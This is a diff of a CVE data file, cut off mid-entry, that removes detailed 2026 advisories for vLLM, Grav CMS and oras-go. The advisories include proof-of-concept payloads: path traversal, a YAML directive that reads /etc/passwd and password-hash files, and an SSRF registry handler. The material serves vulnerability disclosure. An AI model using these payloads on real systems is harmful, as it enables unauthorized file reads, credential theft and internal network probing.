@@ -12,933 +12,875 @@
   },
   "cves": [
     {
-      "id": "CVE-2026-69147",
-      "summary": "## Summary\n\nCurrent vLLM `main` lets an inference request choose the PyNvVideoCodec GPU video decoder through `media_io_kwargs.video.video_backend`, but engine GPU memory reservation is computed only from static startup configuration and `VLLM_VIDEO_LOADER_BACKEND`. If the server starts with the default OpenCV/software backend and no `--mm-ipc-gpu-memory-gb` budget, a client can still route a video request into the PyNvVideoCodec path after startup, causing frontend CUDA-context, decoder-surface, and decoded-frame GPU allocations that were not carved out of the engine KV-cache budget.\n\n## Technical Details\n\nThe vulnerable boundary is the split between request-time media decoding choices in the API server and startup-time memory budgeting in the engine worker. Request bodies for Chat Completions and Responses expose `media_io_kwargs`, and those values are forwarded to the shared media connector. For video inputs, `MediaConnector.fetch_video()` copies `self.media_io_kwargs[\"video\"]` into `video_io_kwargs`, only setting a model-derived backend when `video_backend` is absent. `VideoMediaIO.__init__()` then consumes `video_backend` from those kwargs and loads that backend from `VIDEO_LOADER_REGISTRY`.\n\nThe relevant request-side source path is:\n\n```python\nvideo_io_kwargs = dict(self.media_io_kwargs.get(\"video\", {}))\nif \"video_backend\" not in video_io_kwargs and (\n    video_backend := get_video_loader_backend_for_processor(video_processor)\n):\n    video_io_kwargs[\"video_backend\"] = video_backend\nvideo_io = VideoMediaIO(image_io, **video_io_kwargs)\n```\n\n```python\nvideo_loader_backend = (\n    kwargs.pop(\"video_backend\", None) or envs.VLLM_VIDEO_LOADER_BACKEND\n)\nself.video_loader = VIDEO_LOADER_REGISTRY.load(video_loader_backend)\n```\n\n`VideoBackend.load_bytes()` then dispatches `backend == \"pynvvideocodec\"` into `decode_frames_pynvvideocodec()`, which constructs a PyNvVideoCodec decoder, creates or uses a CUDA stream, reads stream metadata, decodes selected frames on the GPU, and copies those frames into pinned host memory. The new frontend GPU memory pool accounts only for raw decoded frame bytes when a pool exists; it does not make request-time backend selection safe when no startup reservation was made.\n\nThe engine-side reservation code makes its decision from static model config and environment only:\n\n```python\ndef _uses_pynvvideocodec_video_backend(mm_config) -> bool:\n    video_kwargs = mm_config.media_io_kwargs.get(\"video\", {})\n    video_loader_backend = (\n        video_kwargs.get(\"video_backend\") or envs.VLLM_VIDEO_LOADER_BACKEND\n    )\n    codec_backend = video_kwargs.get(\"backend\")\n    return (\n        video_loader_backend == PYNVVIDEOCODEC_VIDEO_BACKEND\n        or codec_backend == PYNVVIDEOCODEC_VIDEO_BACKEND\n    )\n```\n\n```python\ndecoder_reserved_bytes = (\n    num_api_servers * per_server_decoder_bytes\n    if self._uses_pynvvideocodec_video_backend(mm_config)\n    else 0\n)\nreserved_bytes = raw_frame_reserved_bytes + decoder_reserved_bytes\nif reserved_bytes <= 0:\n    return available_kv_cache_memory_bytes\n```\n\nWith default static video configuration, `mm_config.media_io_kwargs[\"video\"]` does not name PyNvVideoCodec and `VLLM_VIDEO_LOADER_BACKEND` defaults to OpenCV/software decoding. The worker therefore reserves no PyNv decoder/CUDA-context bytes. A later request can still set `media_io_kwargs.video.video_backend=\"pynvvideocodec\"` and reach the GPU decoder path because that runtime field is intentionally honored by `VideoMediaIO`.\n\n## PoV\n\nAn ordinary multimodal inference request can carry the backend override in the request body:\n\n```json\n{\n  \"model\": \"served-vlm\",\n  \"messages\": [\n    {\n      \"role\": \"user\",\n      \"content\": [\n        {\"type\": \"text\", \"text\": \"summarize this clip\"},\n        {\"type\": \"video_url\", \"video_url\": {\"url\": \"data:video/mp4;base64,<small-mp4>\"}}\n      ]\n    }\n  ],\n  \"media_io_kwargs\": {\n    \"video\": {\n      \"video_backend\": \"pynvvideocodec\"\n    }\n  }\n}\n```\n\nThe following bounded source-level check confirms the code path without allocating GPU memory:\n\n```bash\ngit clone --filter=blob:none https://github.com/vllm-project/vllm.git\ncd vllm\ngit checkout ddd3855a28a561a5bb54d380c6e6b8b1e883cc4a\npython3 check_pynv_backend_reservation.py --repo .\n```\n\n## PoC\n\nThe bounded check validates current source markers, simulates the exact static reservation predicate, and compares vulnerable and negative-control configurations. Key output:\n\n```json\n{\n  \"vulnerable\": true,\n  \"head\": \"ddd3855a28a561a5bb54d380c6e6b8b1e883cc4a\",\n  \"reservation_simulation\": {\n    \"env_video_loader_backend\": \"opencv\",\n    \"request_selects_pynv_after_startup\": true,\n    \"vulnerable_static_reserved_bytes\": 0,\n    \"negative_control_static_pynv_reserved_bytes\": 2066953011,\n    \"raw_frame_only_control_reserved_bytes\": 268435456,\n    \"unreserved_decoder_bytes_when_only_request_selects_pynv\": 2066953011\n  }\n}\n```\n\nThe negative control is important: when PyNvVideoCodec is selected statically, the worker reserves `2066953011` bytes per API process for decoder surfaces plus CUDA context. The vulnerable case reserves `0` bytes for the same decoder overhead because PyNvVideoCodec is selected only by the later request. A second control with static OpenCV plus `mm_ipc_gpu_memory_gb=0.25` reserves only the raw-frame semaphore budget and still does not reserve PyNv decoder/CUDA-context bytes.\n\n## Impact\n\nAn attacker who can submit video requests to a vLLM deployment with PyNvVideoCodec available can force frontend GPU decoding even when the engine did not reserve memory for that decoder during startup. On high-utilization serving deployments, the unreserved CUDA context, retained decoder surfaces, and decoded-frame allocations can reduce or exhaust GPU memory that the engine assumed was available for weights, activations, or KV cache, causing request failures, worker crashes, or service-level denial of service.\n\nSuggested severity is Medium with conservative CVSS v3.1 `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H` (6.5). If a deployment exposes the affected API without authentication, `PR:N` would raise the deployment-specific score. Suggested weaknesses are `CWE-770` (Allocation of Resources Without Limits or Throttling) and `CWE-400` (Uncontrolled Resource Consumption). This should not be rated Low because the affected resource is shared GPU memory in the serving path and the code already treats the PyNv decoder/CUDA-context footprint as large enough to reserve at startup when statically configured.\n\nLimitations: exploitation requires a GPU deployment where PyNvVideoCodec is installed and usable, and the request must reach a video-capable model/path. The issue does not claim code execution, data disclosure, or SSRF.\n\n## Suggested Fix\n\nDo not allow untrusted request fields to select a GPU decoder that was not included in startup memory reservation. The simplest fix is to reject request-level `media_io_kwargs.video.video_backend=\"pynvvideocodec\"` unless the static server configuration already selected PyNvVideoCodec and reserved its decoder/CUDA-context budget.\n\nIf dynamic backend selection remains supported, split software and GPU decoder policies: allow request selection among CPU/software decoders only, require an explicit operator allowlist for GPU decoders, and include every request-selectable GPU decoder in the startup reservation predicate. Add regression coverage for static OpenCV startup config plus request-level PyNvVideoCodec override, and preserve the negative control where static PyNvVideoCodec configuration reserves decoder/CUDA-context bytes.\n\n## Affected Package/Versions\n\nPackage: `vllm` from `vllm-project/vllm`.\n\nConfirmed affected: current `main` at `ddd3855a28a561a5bb54d380c6e6b8b1e883cc4a`.\n\nIntroduced by: `af16446bf39de047ab57649c933063cf1cbf1e50`, `Vram semaphore infra (#44465)`, committed 2026-06-26T17:32:51-07:00.\n\nRelease status checked: `git tag --contains af16446bf` returned no release tags in the fresh checkout. GitHub repository metadata reported latest published release `v0.23.0` published 2026-06-15T05:27:20Z; the local `v0.24.0` tag also does not contain the introducing commit. The affected range should therefore be current `main` builds containing `af16446bf` until fixed, rather than a confirmed released-version range.\n\n## Advisory History\n\nPublic vLLM advisories checked included audio decompression-bomb DoS, unbounded `video/jpeg` frame-count DoS, MediaConnector SSRF, video processing RCE, multimodal embedding DoS/RCE, GGUF GPU memory exposure, multimodal hashing, and other request-parameter DoS classes. None matched request-selected PyNvVideoCodec or the static VRAM reservation mismatch.\n\nPrior local/private vLLM report families checked included request-level `media_io_kwargs` reopening `video/jpeg` frame fanout, GLM video metadata amplification, and audio media decode duration-limit bypass. Those reports share the request-level media kwargs boundary, but they target CPU/media decode limits or model metadata amplification. This report targets a different privileged asset and fix surface: GPU decoder selection after engine startup memory reservation.\n\nFocused GitHub issue/PR searches for `pynvvideocodec`, `mm_ipc_gpu_memory`, `video_backend media_io_kwargs`, `Vram semaphore infra`, and `frontend multimodal GPU decoding` found the PyNvVideoCodec zero-copy RFC, an old do-not-review prototype, merged PR `#44465`, and an unrelated TorchCodec backend PR. No public issue or PR described this security boundary.\n\n## Appendix: Bounded Source-Level Check\n\n```python\n#!/usr/bin/env python3\nfrom __future__ import annotations\n\nimport argparse\nimport json\nimport re\nimport subprocess\nfrom pathlib import Path\n\nMIB = 1024 * 1024\nGIB = 1024 * MIB\n\ndef read(repo: Path, rel: str) -> str:\n    return (repo / rel).read_text(encoding=\"utf-8\")\n\ndef const_int(source: str, name: str) -> int:\n    expr = re.search(rf\"^{name}\\s*=\\s*(.+)$\", source, flags=re.MULTILINE).group(1).strip()\n    if expr == \"128 * MiB_bytes\":\n        return 128 * MIB\n    if expr == \"int(1.8 * 1024 * MiB_bytes)\":\n        return int(1.8 * 1024 * MIB)\n    if expr == \"1\":\n        return 1\n    raise AssertionError(expr)\n\ndef uses_pynv_static(static_media_io_kwargs: dict[str, dict[str, str]], env_backend: str) -> bool:\n    video_kwargs = static_media_io_kwargs.get(\"video\", {})\n    video_loader_backend = video_kwargs.get(\"video_backend\") or env_backend\n    codec_backend = video_kwargs.get(\"backend\")\n    return video_loader_backend == \"pynvvideocodec\" or codec_backend == \"pynvvideocodec\"\n\ndef reserve_bytes(static_media_io_kwargs, env_backend, mm_ipc_gpu_memory_gb, decoder_bytes, cuda_context_bytes, retained_decoders):\n    raw_frame_reserved_bytes = int(mm_ipc_gpu_memory_gb * GIB)\n    per_server_decoder_bytes = decoder_bytes * retained_decoders + cuda_context_bytes\n    decoder_reserved_bytes = per_server_decoder_bytes if uses_pynv_static(static_media_io_kwargs, env_backend) else 0\n    return raw_frame_reserved_bytes + decoder_reserved_bytes\n\nparser = argparse.ArgumentParser()\nparser.add_argument(\"--repo\", required=True, type=Path)\nrepo = parser.parse_args().repo.resolve()\n\nmedia_video = read(repo, \"vllm/multimodal/media/video.py\")\nconnector = read(repo, \"vllm/multimodal/media/connector.py\")\nchat_protocol = read(repo, \"vllm/entrypoints/openai/chat_completion/protocol.py\")\nresponses_protocol = read(repo, \"vllm/entrypoints/openai/responses/protocol.py\")\ngpu_worker = read(repo, \"vllm/v1/worker/gpu_worker.py\")\nvideo_core = read(repo, \"vllm/multimodal/video.py\")\n\nassert \"media_io_kwargs: dict[str, dict[str, Any]] | None = Field(\" in chat_protocol\nassert \"media_io_kwargs: dict[str, dict[str, Any]] | None = Field(\" in responses_protocol\nassert 'video_io_kwargs = dict(self.media_io_kwargs.get(\"video\", {}))' in connector\nassert 'if \"video_backend\" not in video_io_kwargs and (' in connector\nassert 'kwargs.pop(\"video_backend\", None) or envs.VLLM_VIDEO_LOADER_BACKEND' in media_video\nassert \"elif backend == PYNVVIDEOCODEC_VIDEO_BACKEND:\" in video_core\nassert 'video_kwargs = mm_config.media_io_kwargs.get(\"video\", {})' in gpu_worker\n\ndecoder_bytes = const_int(video_core, \"PYNVVIDEOCODEC_DECODER_GPU_MEMORY_BYTES\")\nretained_decoders = const_int(video_core, \"PYNVVIDEOCODEC_MAX_RETAINED_DECODERS\")\ncuda_context_bytes = const_int(video_core, \"PYNVVIDEOCODEC_CUDA_CONTEXT_BYTES\")\nper_server_decoder_bytes = decoder_bytes * retained_decoders + cuda_context_bytes\n\nvulnerable_static_reserved = reserve_bytes({}, \"opencv\", 0.0, decoder_bytes, cuda_context_bytes, retained_decoders)\nnegative_control_reserved = reserve_bytes({\"video\": {\"video_backend\": \"pynvvideocodec\"}}, \"opencv\", 0.0, decoder_bytes, cuda_context_bytes, retained_decoders)\nraw_frame_only_control = reserve_bytes({}, \"opencv\", 0.25, decoder_bytes, cuda_context_bytes, retained_decoders)\n\nhead = subprocess.check_output([\"git\", \"-C\", str(repo), \"rev-parse\", \"HEAD\"], text=True).strip()\nprint(json.dumps({\n    \"head\": head,\n    \"vulnerable\": vulnerable_static_reserved == 0 and negative_control_reserved == per_server_decoder_bytes,\n    \"reservation_simulation\": {\n        \"env_video_loader_backend\": \"opencv\",\n        \"request_selects_pynv_after_startup\": True,\n        \"vulnerable_static_reserved_bytes\": vulnerable_static_reserved,\n        \"negative_control_static_pynv_reserved_bytes\": negative_control_reserved,\n        \"raw_frame_only_control_reserved_bytes\": raw_frame_only_control,\n        \"unreserved_decoder_bytes_when_only_request_selects_pynv\": per_server_decoder_bytes,\n    },\n}, indent=2, sort_keys=True))\n```",
-      "cvssScore": 6.5,
+      "id": "CVE-2001-0075",
+      "summary": "Directory traversal vulnerability in main.cgi in Technote allows remote attackers to read arbitrary files via a .. (dot dot) attack in the filename parameter.",
+      "cvssScore": 5,
       "severity": "Medium",
-      "published": "2026-09-17",
-      "modified": "2026-09-17",
-      "cwe": {
-        "cwe_id": "CWE-400",
-        "name": "Uncontrolled Resource Consumption"
-      },
-      "references": [
-        "https://github.com/vllm-project/vllm/security/advisories/GHSA-8pw2-6jv3-mj5j",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-69147",
-        "https://github.com/vllm-project/vllm/pull/47259",
-        "https://github.com/vllm-project/vllm/commit/283893c72292ede38d277e3cd2b9b64c3e4f1dda",
-        "https://github.com/vllm-project/vllm/commit/ba22152096b2484faa3579624a253d54804d876d"
-      ],
-      "vulnerableProducts": [
-        "vllm pip"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-69089",
-      "summary": "Reported by: Nihad Huseynli (@nihaddhuseynli (https://github.com/nihaddhuseynli)) — nihadd.huseynli@gmail.com\n\n▎ Note: I attempted to report this via security@getgrav.org first, per SECURITY.md, but the email bounced with 550 5.1.1 Address does not exist. Filing directly here instead.\n\nPath Traversal in ImageMedium::watermark() leading to arbitrary file disclosure via publicly-served images\n\nSummary\n\nThe watermark media action, documented and allow-listed for use in editor-authored Markdown image syntax, passes its $image argument unsanitized into UniformResourceLocator::findResource(). That resolver only lexically collapses .. segments (no realpath()/containment check) and, for the default file:// scheme, resolves straight to file_exists() with no re-validation against the registered stream root. A relative-path traversal string therefore resolves to an arbitrary absolute path on disk. If that path is a valid image, its pixel content is composited into the carrier image and the result is cached and served from a public, unauthenticated URL — i.e. any file outside Grav's media sandbox that happens to be a decodable image becomes visible to anonymous visitors, not just to the attacker.\n\nAffected version\n\n- Grav CMS, develop/2.0 line, commit db8c1fcd63aaaf6d6b244bc6b4cfa5f7b96bbc7f (tip of 2.0.11 post-release).\n- Root cause lives in the pinned dependency rockettheme/toolbox v2.x-dev @ c569a53304cd7d95ff21bffa6fc590adcf0be83d (per composer.lock), specifically RocketTheme\\Toolbox\\ResourceLocator\\UniformResourceLocator.\n- Not yet fixed as of this commit; unrelated to the four GHSA-* advisories already patched in 2.0.7–2.0.11 (which addressed arbitrary method-name dispatch, not this parameter-content issue).\n\nRoot cause\n\nUniformResourceLocator::normalize() (ResourceLocator/src/UniformResourceLocator.php:261) cleans ../. segments purely as string manipulation against $this->base:\n\nforeach ($parts as $i => $part) {\n    if ($part === '..') {\n        $part = array_pop($list);\n        if ($part === null || $part === '' || (!$list && strpos($part, ':'))) {\n            return false; // only refuses once popped past the leading sentinel\n        }\n    } ...\n}\n\nGiven enough ../ segments to match the depth of $this->base, this legitimately resolves to any absolute path on the filesystem, as string math. The file://-scheme branch of findCached() (UniformResourceLocator.php:476-493) then trusts that normalized path directly:\n\nif ($scheme === 'file') {\n    if (!$all && !file_exists($file)) {\n        $this->cache[$key] = $array ? [] : false;\n    } else {\n        $this->cache[$key] = $array ? [$file] : $file;   // <-- returned as-is\n    }\n}\n\nUnlike the else branch (find()), which re-glues resolved filenames onto a registered scheme root, the file:// branch performs no containment check.\n\nImageMedium::watermark() (system/src/Grav/Common/Page/Medium/ImageMedium.php:367) feeds attacker-influenced input straight into this resolver:\n\npublic function watermark($image = null, $position = null, $scale = null)\n{\n    ...\n    $args = func_get_args();\n    $file = $args[0] ?? '1';\n    $file = $file === '1' ? $config->get('system.images.watermark.image') : $args[0];\n\n    $watermark = $locator->findResource($file);   // no path validation\n    $watermark = ImageFile::open($watermark);      // decoded & composited\n    ...\n}\n\nwatermark is on Grav's own documented allow-list of Markdown image actions (Medium::ALLOWED_ACTIONS), so it is directly reachable through Excerpts::processMediaActions() (system/src/Grav/Common/Page/Markdown/Excerpts.php:262), which parses the querystring of any Markdown image reference and dispatches call_user_func_array([$medium, $action['method']], $args) for allow-listed methods — watermark's own parameter is never checked for path-safety anywhere in that chain.\n\nThreat model\n\nPer Grav's own SECURITY.md trust-boundary rubric: a publisher/editor (page-edit rights, no admin panel super-user access required) authors ordinary page content — the same trust tier already covered by the project's last four security advisories (GHSA-fj2p-qj2f-74v5, GHSA-c4wf-2xxc-68qm, GHSA-xwv3-2mv2-w33x, GHSA-ffmg-hfvg-jhg9). This is a new instance of that same \"editor escapes their content sandbox\" bug family, via an image-processing parameter rather than method-name dispatch.\n\nImpact is not limited to the editor's own session: once the page is saved, any anonymous site visitor who requests the page causes the traversal to execute (if not already cached), and the resulting composited image is served from a public, unauthenticated cache URL.\n\nProof of Concept\n\nReproduced end-to-end against a clean local install of the affected commit (PHP 8.4.22, PHP built-in server, composer install --no-dev, bin/grav install).\n\n1. Outside the Grav webroot (one directory up), place a distinguishable \"secret\" image: a solid red 200x200 PNG, secret_outside_root.png.\n2. As an editor account (page-edit permission only, no admin.super), create a page with a solid blue 200x200 PNG carrier.png alongside it, and page content:\n![carrier](carrier.png?watermark=../secret_outside_root.png)\n3. Any anonymous visitor requests the page: GET /poc. Grav renders an <img> tag pointing at a cached, public derivative URL, e.g. /images/b/2/8/2/2/b282200a65ce979377963180629babd2335212ba-carrier.png.\n4. Fetching that URL (again unauthenticated) and sampling pixels confirms the composited output contains the secret file's content:\ncorner pixel (from carrier.png):            RGB(0, 0, 255)   — blue, expected\ncenter pixel (from secret_outside_root.png): RGB(255, 0, 0)   — red, exfiltrated\n\n(Test images and the exfiltrated output are attached separately — let me know if you need them regenerated.)\n\nSuggested fix\n\n- In UniformResourceLocator::findCached()'s file:// branch, resolve the candidate path with realpath() and verify it remains inside $this->base before returning it — mirroring the containment that already exists implicitly in the non-file branch (find()).\n- Independently, in ImageMedium::watermark(), restrict $image to a filename (reject any value containing /, \\, or resolving outside user/pages/**/media and the configured watermark image root) before calling findResource().\n\nSuggested severity\n\nHigh — a lower-privilege actor's stored content results in exfiltration of data outside that actor's granted scope, and the exfiltrated data is exposed to anonymous third parties via a public cache URL, not just back to the attacker.",
-      "cvssScore": 8.7,
-      "severity": "High",
-      "published": "2026-09-17",
-      "modified": "2026-09-17",
-      "cwe": {
-        "cwe_id": "CWE-22",
-        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
-      },
-      "references": [
-        "https://github.com/getgrav/grav/security/advisories/GHSA-w3f4-8pj2-599w",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-69089",
-        "https://github.com/getgrav/grav/commit/b282200a65ce979377963180629babd2335212ba",
-        "https://github.com/getgrav/grav/commit/c569a53304cd7d95ff21bffa6fc590adcf0be83d",
-        "https://github.com/getgrav/grav/commit/db8c1fcd63aaaf6d6b244bc6b4cfa5f7b96bbc7f"
-      ],
-      "vulnerableProducts": [
-        "getgrav/grav composer"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-69088",
-      "summary": "### Summary\nGrav CMS's blueprint dynamic-field callable guard can be bypassed with a fully-qualified `Class::method` string, letting an account with only page-editing rights (`admin.pages`, not super-admin) plant a directive in a page's form-field frontmatter that invokes an arbitrary public static PHP method with attacker-controlled arguments. Using built-in gadget methods this yields, at minimum, arbitrary reading of any server-readable file (disclosed to anonymous visitors of the crafted page) and arbitrary creation/copying of files and directories under the web-server account.\n\n### Details\n`Blueprint::isSafeDynamicCall()` (`system/src/Grav/Common/Data/Blueprint.php`, method around line 488) is meant to block dangerous callables named in a blueprint's dynamic-field directives (`data-*@`). It only consults its dangerous-name denylist when the callable string does **not** contain `::`:\n```php\nif (is_string($function) && !str_contains($function, '::') && Utils::isDangerousFunction($function)) {\n    return false;\n}\n```\nAny callable string containing `::` — i.e. every `Class::method` static call — skips the check entirely and is passed to `call_user_func_array()` at `Blueprint::dynamicData()` (`Blueprint.php`, around line 461) and `FlexDirectory::dynamicDataField()` (`system/src/Grav/Framework/Flex/FlexDirectory.php`, around line 937). There is no allowlist restricting which classes or methods may be invoked this way; only the call's *arguments* are (separately) scanned for smuggled dangerous callables, never the target itself.\n\n`Utils::isDangerousFunction()` (`system/src/Grav/Common/Utils.php`) classifies any string containing a colon (`str_contains($name, \":\")`) or a namespace backslash as dangerous — so a qualified `Class::method` string would be rejected *if* it ever reached this function. The `!str_contains($function, '::')` condition in `isSafeDynamicCall()` ensures it never does, which is what leaves qualified static calls entirely unscreened. (Whether the exemption was intended to admit legitimate `Class::method` option-providers is a plausible reading of the surrounding code, but the intent is not established here.)\n\nThis is an incomplete fix of two recently published advisories — one addressing page editors executing hidden callables via form-field settings, the other extending the same guard to Flex directories. The guard those fixes introduced never covered qualified static calls. Grav's own permission model separates page-content code execution into a distinct, higher privilege (`admin.pages_twig`) from plain page editing (`admin.pages`), so invoking arbitrary methods from an `admin.pages`-authored page is a genuine trust-boundary bypass, not editor capability by design.\n\n### PoC\nTested on Grav `develop` at commit `db8c1fc` (which self-reports version 2.0.11) with the admin and form plugins, using an account granted only `admin.login` + `admin.pages` (page editor, not super-admin). The same guard is present in every current release from 2.0.7 through 2.0.10. Base URL shown as `https://grav.example`.\n\n**A. Arbitrary file read (confidentiality)**\n\n1. Log in to `/admin` as the page-editor account (GET `/admin` for the login nonce, then POST `task=login`).\n2. Save a page via the standard admin endpoint, `POST /admin/pages/<route>` with the session cookie, the admin nonce, and `data[frontmatter]` containing a form field with a `download` gadget directive:\n    ```yaml\n    forms:\n      x:\n        fields:\n          y:\n            type: text\n            data-opts@:\n              - 'Grav\\Common\\Utils::download'\n              - '/etc/passwd'\n              - false\n              - 0\n              - 1024\n              - mime: 'text/plain'\n    ```\n   The server returns `HTTP 200` and accepts the save — the `data-opts@` directive is not rejected.\n3. As an unauthenticated visitor (no cookies), request the saved page, e.g. `GET /<route>` (use a fresh query string to avoid a cached copy; immediately after saving, a first request may `404` while the flat-file page index catches up — retry moments later). The response is `HTTP 200` with the raw contents of `/etc/passwd` in the body (`root:x:0:0:...`). Pointing the path at `user/accounts/<name>.yaml` instead returns that account file, including its `hashed_password:` bcrypt line — i.e. an anonymous visitor obtains a stored administrator's password hash.\n\n**B. Arbitrary file/directory write (integrity) — verified**\n\nUsing the same mechanism with `Grav\\Common\\Filesystem\\Folder::copy` (a public static method taking source and destination paths), a page editor caused the server to copy an existing page directory to an attacker-chosen new path under `user/pages/`; the newly created page then rendered its (attacker-controlled) content at the new route over plain HTTP. This demonstrates attacker-controlled creation of files/directories anywhere the web-server account can write. `Folder::move` and `Folder::delete` are equally reachable (their destructive nature was not exercised).\n\n### Impact\nA page editor (an `admin.pages`-only account, **not** super-admin) can, through a page they author:\n\n- **Read any server-readable file**, disclosed to any anonymous, unauthenticated visitor of the crafted page — including `user/accounts/*.yaml`, which stores account metadata and bcrypt password hashes. An attacker may attempt offline cracking of a disclosed hash; recovery of a weak or reused administrator password could lead to full admin-panel compromise. Other secrets on disk (site/plugin config, environment files) are equally exposed.\n- **Create or overwrite files and directories** under the web-server account (demonstrated via `Folder::copy`), with `Folder::move`/`Folder::delete` additionally reachable for destructive tampering.\n\nBecause the guard permits *any* public static method, the reachable impact is bounded only by the gadget surface of the loaded codebase, not by this report's demonstrated cases.",
-      "cvssScore": 8.1,
-      "severity": "High",
-      "published": "2026-09-17",
-      "modified": "2026-09-17",
-      "cwe": {
-        "cwe_id": "CWE-94",
-        "name": "Improper Control of Generation of Code ('Code Injection')"
-      },
-      "references": [
-        "https://github.com/getgrav/grav/security/advisories/GHSA-7pgq-cr25-xvc8",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-69088",
-        "https://www.vulncheck.com/advisories/grav-cms-through-arbitrary-method-invocation-via-blueprint",
-        "https://github.com/advisories/GHSA-7pgq-cr25-xvc8"
-      ],
-      "vulnerableProducts": [
-        "getgrav/grav composer"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-85732",
-      "summary": "## Summary\n\noras-go's pagination helper `parseLink()` in `registry/remote/utils.go` follows the `Link` response header from a registry without validating the URL's host or scheme. When a malicious registry returns a `Link` header containing an absolute URL pointing to an arbitrary host (e.g., a cloud metadata endpoint), the client makes GET requests to that host from the victim's network.\n\nThis affects all pagination-based listing operations: Tags, Referrers, and Repositories (catalog).\n\n## Root Cause\n\n`parseLink()` at `registry/remote/utils.go:54` calls `resp.Request.URL.Parse(link)` which, for absolute URLs, returns the absolute URL unchanged. The result is passed directly to the next pagination loop iteration where `http.NewRequestWithContext()` creates a GET request to the attacker-specified URL. No host comparison, scheme validation, or IP filtering exists between `parseLink` output and the HTTP request.\n\n## Affected Code Paths\n\n- `registry/remote/repository.go:Tags()` calls `parseLink()` for next page URL\n- `registry/remote/repository.go:Referrers()` calls `parseLink()` for next page URL\n- `registry/remote/registry.go:Repositories()` calls `parseLink()` for next page URL\n\n## Impact\n\n**Blind SSRF from the victim's network.** A malicious registry operator can force any oras-go client that lists tags, referrers, or repositories to issue GET requests to arbitrary internal endpoints:\n\n- Cloud instance metadata endpoints for service discovery and IAM role enumeration\n- Internal HTTP services for port scanning and triggering side effects\n- If the victim's credential store maps credentials for the SSRF target host, those credentials are attached to the request (auth.Client looks up creds by request host)\n\nThe attacker cannot read the response body (it's parsed as JSON and fails), making this a blind SSRF. However, timing and error differences can confirm internal service existence.\n\n## Attack Chain\n\n1. Victim calls `repo.Tags()` / `repo.Referrers()` / `registry.Repositories()` against attacker-controlled registry\n2. Registry returns a valid first page + malicious Link header pointing to an internal endpoint\n3. `parseLink()` extracts the absolute URL with zero validation\n4. Pagination loop makes GET request to the internal endpoint from victim's network\n\n## PoC\n\n<details>\n<summary>Expand PoC</summary>\n\n```go\n// Malicious registry handler for /v2/repo/tags/list:\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    // Link header points to cloud metadata or internal service\n    w.Header().Set(\"Link\", `<http://internal-service:8080/admin>; rel=\"next\"`)\n    w.Header().Set(\"Content-Type\", \"application/json\")\n    json.NewEncoder(w).Encode(map[string][]string{\"tags\": {\"v1\"}})\n}\n\n// Victim code:\nrepo, _ := remote.NewRepository(\"attacker-registry.io/repo\")\nrepo.Tags(ctx, \"\", func(tags []string) error { return nil })\n// Result: GET http://internal-service:8080/admin is made from victim's network\n```\n\n</details>\n\n## Suggested Fix\n\nValidate that the URL returned by `parseLink()` has the same host and scheme as the original request before using it for the next pagination request. Reject cross-host or scheme-downgrade URLs.\n\nReported by **zx (Jace)**",
-      "cvssScore": 4.7,
-      "severity": "Medium",
-      "published": "2026-09-17",
-      "modified": "2026-09-17",
-      "cwe": {
-        "cwe_id": "CWE-918",
-        "name": "Server-Side Request Forgery (SSRF)"
-      },
-      "references": [
-        "https://github.com/oras-project/oras-go/security/advisories/GHSA-h7vf-4x9w-h99v",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-85732",
-        "https://github.com/oras-project/oras-go/commit/31da1963f8c327dd089cd29faeae95cf0fc50842",
-        "https://github.com/oras-project/oras-go/releases/tag/v2.6.2",
-        "https://github.com/advisories/GHSA-h7vf-4x9w-h99v"
-      ],
-      "vulnerableProducts": [
-        "oras.land/oras-go/v2 go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-85731",
-      "summary": "### Summary\nThe `content/file.Store` in oras-go v2 unpacks OCI layer tarballs when a descriptor carries `io.deis.oras.content.unpack=true`. The extraction routine validates symlink targets purely lexically (`filepath.Join`) and, for regular files placed directly at the extraction root, skips the parent-symlink `Lstat` walk. A malicious tarball can plant a chain of symlinks whose lexical target stays inside the extraction root but whose kernel-resolved target is any absolute path, then write through it with a follow-up regular-file entry. The result is arbitrary file create/overwrite outside the store's working directory under the default `AllowPathTraversalOnWrite=false` configuration — a canonical tar-slip → RCE primitive.\n\n### Details\n**Affected versions:** `<= v2.6.1`\n\n**Entry point:** `content/file/file.go` line 486, `(*Store).pushDir` — reached from `(*Store).Push` for any descriptor whose annotations include `io.deis.oras.content.unpack: \"true\"` (i.e. `file.AnnotationUnpack`) and an `org.opencontainers.image.title`. `oras.Copy` from a remote registry into a `file.New(dir)` store invokes this per layer.\n\n**Root cause 1 — lexical link validation.** `content/file/utils.go` lines 264–275, `ensureLinkPath`:\n\n```go\nfunc ensureLinkPath(baseAbs, baseRel, link, target string) (string, error) {\n        // resolve link\n        path := target\n        if !filepath.IsAbs(target) {\n                path = filepath.Join(filepath.Dir(link), target)\n        }\n        // ensure path is under baseAbs or baseRel\n        if _, err := resolveRelToBase(baseAbs, baseRel, path); err != nil {\n                return \"\", err\n        }\n        return target, nil\n}\n```\n\n`filepath.Join` cleans `..` components textually and does **not** dereference symlinks in intermediate components. It therefore cannot detect that a component of `target` is itself a previously-extracted symlink that the kernel will follow before applying subsequent `..` components.\n\n**Root cause 2 — parent-symlink check skipped for root-level entries.** `content/file/utils.go` lines 247–257, inside `resolveRelToBase`:\n\n```go\n// No symbolic link allowed in the relative path\ndir := filepath.Dir(path)\nfor dir != \".\" {\n        if info, err := os.Lstat(filepath.Join(baseAbs, dir)); err != nil {\n                ...\n        } else if info.Mode()&os.ModeSymlink != 0 {\n                return \"\", fmt.Errorf(\"no symbolic link allowed between %q and %q\", baseRel, target)\n        }\n        dir = filepath.Dir(dir)\n}\n```\n\nFor an entry named `<title>/escape`, `path == \"escape\"` and `filepath.Dir(\"escape\") == \".\"`, so the loop body never executes — the entry itself is never `Lstat`-checked.\n\n**Root cause 3 — write follows symlinks.** `content/file/utils.go` line 279, `writeFile`:\n\n```go\nfile, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, perm)\n```\n\nNo 